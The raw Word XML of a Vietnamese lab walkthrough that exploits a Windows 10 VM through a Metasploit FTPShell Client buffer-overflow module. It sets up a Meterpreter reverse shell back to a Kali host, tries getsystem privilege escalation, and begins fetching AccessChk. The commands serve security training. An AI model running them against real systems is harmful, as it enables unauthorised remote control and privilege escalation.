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527C4" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>DUMBUSER WINDOWS 10 ENUMERATION AND EXPLOITATION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC34E50" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:t>IP máy DumbUser Windows 10: [ĐIỀN IP MÁY MỤC TIÊU]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A0312C" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:t>IP máy Kali: 192.168.56.105</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="168B4439" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Đường dẫn tải máy ảo và tài nguyên: </w:t>
      </w:r>
      <w:hyperlink r:id="rId6">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Google Drive</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="77C4ED02" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>1. Khai thác dịch vụ FTP và tạo phiên Meterpreter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C56FAB" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Khởi động Metasploit và chọn module khai thác lỗi tràn bộ đệm của FTPShell Client.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2959DC66" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7768F065" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="00215C38" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FDB4D81" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Mở Metasploit Framework để sử dụng các module khai thác và payload phục vụ quá trình kiểm thử.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034BCB6C" w14:textId="17E1EC6F" w:rsidR="006A2813" w:rsidRDefault="00613115">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="51382CD9" wp14:editId="28391A45">
            <wp:extent cx="6152515" cy="3547110"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="104563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5502" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3547110"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Chọn module khai thác FTPShell Client Buffer Overflow.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC79D84" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF29C09" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="00215C38" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>use windows/ftp/ftpshell_cli_bof</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F58CFE7" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Module này được sử dụng để khai thác lỗi tràn bộ đệm trong dịch vụ hoặc phần mềm FTPShell Client của máy Windows mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2C8119" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Thiết lập địa chỉ máy Kali cho máy chủ khai thác và kết nối reverse shell.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F616E0E" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C7DDFB" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="00215C38" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>set LHOST 192.168.56.105</w:t>
      </w:r>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>set SRVHOST 192.168.56.105</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499BF0A7" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>LHOST là địa chỉ nhận kết nối ngược của payload. SRVHOST là địa chỉ mà máy chủ phục vụ nội dung khai thác sẽ lắng nghe. Cả hai được đặt là IP của máy Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6C03EA" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Chọn payload Meterpreter kết nối ngược về Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DF32A1" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA5FF76" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="00215C38" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>set payload windows/meterpreter/reverse_tcp</w:t>
      </w:r>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44463BD1" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Payload windows/meterpreter/reverse_tcp tạo một phiên Meterpreter khi máy mục tiêu thực thi mã khai thác. Lệnh run bắt đầu module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3F322B" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRDefault="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3A62B955" wp14:editId="786CB503">
            <wp:extent cx="6152515" cy="1695450"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="141827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78578" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1695450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE24754" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Trên Windows, trong FTPShell Client nhập: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D756B4" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Address: 192.168.56.105</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E261487" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Port: 21</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35EE506B" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Login: anonymous</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128FD664" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Password: để trống hoặc nhập bất kỳ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="332072AD" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Phần Name có thể để mặc định New Session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EDC2119" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Nhấn Connect.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714826AF" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRDefault="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D6CD3D8" w14:textId="52AABFA0" w:rsidR="00486CA4" w:rsidRDefault="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7B8641E6" wp14:editId="360F6C78">
            <wp:extent cx="6152515" cy="4770120"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="188332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4951" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="4770120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C8F8888" w14:textId="13524EFD" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kết nối FTP đã thành công.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF93C96" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>192.168.56.148 - connected</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77963CCD" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Request: USER anonymous</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A77D68" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Request: PASS anonymous@anon.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0982DF38" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Response: Sending 230 OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBA120D" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Request: PWD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09536B18" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRPr="00486CA4" w:rsidRDefault="00486CA4" w:rsidP="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00486CA4">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Request: Sending the malicious response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7344AC28" w14:textId="77777777" w:rsidR="00486CA4" w:rsidRDefault="00486CA4">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F50FD73" w14:textId="3F5E9F5C" w:rsidR="00486CA4" w:rsidRDefault="005B1B10">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B3B45C9" wp14:editId="6BF100A4">
            <wp:extent cx="6152515" cy="1104900"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="128508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85943" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1104900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015F6D7C" w14:textId="0F745851" w:rsidR="006A2813" w:rsidRDefault="00486CA4">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>2. Kiểm tra quyền và thu thập thông tin hệ thống</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F7D9BB" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Xác định tài khoản đang chạy phiên Meterpreter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7368B0CD" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="125393EC" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="00215C38" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>getuid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5E8A7F" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh getuid hiển thị danh tính của tài khoản mà phiên Meterpreter hiện tại đang sử dụng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F3E1BB" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Thử nâng quyền tự động lên SYSTEM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B27BA97" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2E3621" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="00215C38" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>getsystem</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DDF72D2" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh getsystem thử các kỹ thuật nâng quyền tích hợp của Meterpreter. Nếu không thành công, cần kiểm tra thủ công quyền dịch vụ và quyền ghi tệp.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758DCB34" w14:textId="7F9511A1" w:rsidR="006A2813" w:rsidRDefault="005B1B10">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14D2471A" wp14:editId="49E81A12">
            <wp:extent cx="6152515" cy="1400175"/>
            <wp:effectExtent l="0" t="0" r="635" b="9525"/>
            <wp:docPr id="76028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82927" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1400175"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>3. Kiểm tra quyền dịch vụ bằng AccessChk</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E62D24B" w14:textId="065AF00F" w:rsidR="00215C38" w:rsidRDefault="00215C38">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Ktra trên máy kali đã có tệp </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>AccessChk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> chưa nếu chưa thì</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BF94EE" w14:textId="77777777" w:rsidR="00215C38" w:rsidRPr="00215C38" w:rsidRDefault="00215C38" w:rsidP="00215C38">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Trên Kali chạy:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C127B4" w14:textId="77777777" w:rsidR="00215C38" w:rsidRPr="00215C38" w:rsidRDefault="00215C38" w:rsidP="00215C38">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cd ~/Downloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="051D1BE8" w14:textId="77777777" w:rsidR="00215C38" w:rsidRPr="00215C38" w:rsidRDefault="00215C38" w:rsidP="00215C38">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wget https://download.sysinternals.com/files/AccessChk.zip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C43BE4" w14:textId="77777777" w:rsidR="00215C38" w:rsidRPr="00215C38" w:rsidRDefault="00215C38" w:rsidP="00215C38">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>unzip AccessChk.zip -d AccessChk</w:t>
      </w:r>
    </w:p>
